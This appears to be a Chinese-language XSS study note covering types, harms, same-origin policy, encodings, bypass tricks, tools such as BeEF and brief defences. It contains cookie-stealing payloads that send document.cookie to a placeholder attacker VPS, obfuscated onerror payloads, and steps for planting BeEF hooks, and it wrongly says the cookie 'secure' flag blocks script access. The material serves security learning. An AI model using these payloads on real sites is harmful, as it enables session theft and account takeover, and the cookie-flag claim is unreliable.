## 一、漏洞原理

### 1、简介

```php
# 解释
	XSS(Cross Site Scripting)跨站脚本攻击，攻击者通过向Web页面中插入恶意JavaScript代码，当用户访问该页面时，插入的恶意代码被触发，从而达到攻击用户的目的。
```



### 2、分类

```php
# 反射型
	反射型XSS又称非持久型XSS，这种攻击为一次性。攻击者通过邮件等形式将包含XSS代码的链接发送给用户，当用户点击时，服务器接受并处理该用户的请求，然后把带有XSS的代码发送给用户，浏览器解析并执行代码，触发XSS攻击。
```

```php
# 存储型
	存储型XSS又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有隐蔽性和持久性。攻击者通过在论坛、博客、留言板的发帖过程中插入XSS代码，帖子被存储在目标服务器中，每个访问该帖子的用户都会触发XSS代码，并遭受到攻击。
```

```php
# DOM型
	DOM（Document Object Model）文档对象模型，与反射型、存储型在原理上有本质区别，它的攻击代码是通过浏览器端的DOM解析，不需要服务器解析。客户端上的Javascript脚本可以访问浏览器的DOM并修改网页内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。如 document.getElementById('x').innerHTML、document.write等。
```



### 3、危害

```php
3.1、窃取管理员账号密码或Cookie，冒充管理员身份登陆后台。
3.2、窃取用户个人信息或登陆账号，对网站用户安全产生巨大威胁。
3.3、网站挂马。
3.4、发送广告或垃圾信息。
```



### 4、相关知识

​	4.1、浏览器同源策略

```php
# 同源策略
	SOP（Same-origin Policy）同源策略，指协议、主机名、端口完全相同，用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面。只有两个页面属于同一个元才能相互访问，不同源的客户端在没有授权的情况下，不能读取对方资源。
```

```php
# IE源处理
1、位于可信域（Trust Zones）的互信的域名之间，不受同源策略限制。
2、IE在判断同源时不考虑端口。
3、可以通过document.domain读取或修改源。
```

```php
# document.domain
	domain属性解决了因同源安全策略带来的不同文档的属性共享问题。降域document.domain同源策略认为域和子域属于不同的域，如 a.com 和 xx.a.com，可通过在两个页面都设置document.domain='a.com'，使浏览器认可其为同一个源。
```

​	4.2、Cookie httponly

```php
# Cookie
	网站为了辨别用户身份，由Web服务器保存在用户浏览器上的小文本文件。Cookie中存储了客户端上的一小段数据，通常为不敏感信息。
```

```php
# Cookie httponly
	语法：setcookie(name,value,expire,path,domain,secure)
	解释：name（必需，cookie名称）
		 value（必需，cookie值）
		 expire（可选，cookie有效期）
		 path（可选，cookie服务器路径）
		 domain（可选，cookie域名）
		 secure（可选，规定是否通过HTTPS传输cookie）
	设置Cookie中的secure为true时，JS就无法获取到coookie。
```

​	4.3、XSS-Filter过滤器

```php
# htmlspecialchars()函数
	把预定义的字符转换为HTML实体。
	预定义字符：
		& => &amp;
		" => &quot;
		' => '
		< => &lt;
		> => &gt;
```

```php
# htmlentities()函数
	把字符转换为HTML实体。
```

```php
# strip_tags()函数
	剥去字符串中的HTML、XML和PHP标签。
```

```php
# 自定义Filter
	正则表达式过滤字符。
```

​	4.4、编码

```php
# 实体编码
# 工具链接
https://www.toolnb.com/tools/htmlende.html
# 1、十进制
<img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=alert&#40;&#49;&#41;>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
# 2、十六进制
<img src=x onerror=alert&#x0028;1&#x0029;>
<img src=x onerror=alert&#x28;1&#x29;>
```

```php
# 进制编码
# 工具链接
1、https://www.qqxiuzi.cn/bianma/ascii.htm
2、http://www.ku51.net/ox2str/
3、http://bianma.55cha.com/
# 1、10进制ascii码
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
# 2、十六进制字符串
<img src=x onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")>
# 3、unicode
<img src=x onerror=eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")>
```

```php
# url编码
# 工具链接
http://www.ab173.com/enc/urlencode.php
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

```php
# jsfuck
# 工具链接
http://www.jsfuck.com/
```



## 二、漏洞特征

### 1、场景

```php
# 反射型
1、搜索
2、跳转
```

```php
# 存储型
1、用户账号
2、昵称
3、评论
4、留言板
5、文章标题
6、文章标签
7、文章正文
```

### 2、发现

```php
# HTML
1、文本
2、标签属性
3、列表
4、隐藏的提交参数hidden
```

```php
# 数据提交方式
1、GET
2、POST
3、Cookie
4、Referer
```



## 三、利用条件

### 1、数据有回显

### 2、数据有交互



## 四、利用方法

### 1、盗取Cookie

```php
# img
<img src=x onerror = document.body.appendChild(document.createElement('img')).setAttribute('src','http://VPS地址:80/?='+document.cookie); >
```

```php
# script
<script>window.location.href='http://VPS地址/?cookie='+document.cookie</script>
```

```php
# body
<body onload=eval(“document.body.appendChild(document.createElement('img')).setAttribute('src','http://VPS地址/?='+document.cookie);”)></body>
```



## 五、绕过防护

### 1、限制长度

```php
F12审查元素修改maxlength值
```

### 2、关键字

```php
# < >
1、编码
2、注释后面内容//
```

```php
# javascript
1、编码
2、事件
```

```php
# "
1、'
```

```php
# 空格
1、编码
```



## 六、实战思路

### 1、确定敏感功能点

### 2、输入正常字符

### 3、查找字符所在位置

### 4、构造Payload

### 5、考虑闭合

### 6、绕过防护



## 七、相关工具

### 1、BeEF

```php
# 链接
https://www.wangan.com/docs/781
```

```php
# 用法
1、浏览器打开BeEF http://ip:3000/
2、默认账号密码beef beef
3、网页插入Payload 
    <script src="http://ip:3000/hook.js"></script>
4、等待上线
```

### 2、XSS平台

```php
# 链接
https://xss8.cc/login/
```

```php
# 用法
1、创建项目
2、选择模块（优先默认模块）
3、创建成功
4、查看项目代码
5、复制代码并插入网站
6、等待上线
```



## 八、防护措施

### 1、HttpOnly

### 2、输入过滤

### 3、输出过滤

### 4、其他补充

```php
# 参考文章
https://blog.csdn.net/weixin_40270125/article/details/89415990?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165148799616782388065511%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165148799616782388065511&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-89415990.142^v9^pc_search_result_control_group,157^v4^control&utm_term=XSS%E9%98%B2%E5%BE%A1&spm=1018.2226.3001.4187
```



## 九、其他补充

### 1、参考文章

```php
https://blog.csdn.net/qq_45884195/article/details/107136606?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165147584316780366563990%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165147584316780366563990&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107136606.142^v9^pc_search_result_control_group,157^v4^control&utm_term=xss&spm=1018.2226.3001.4187
```

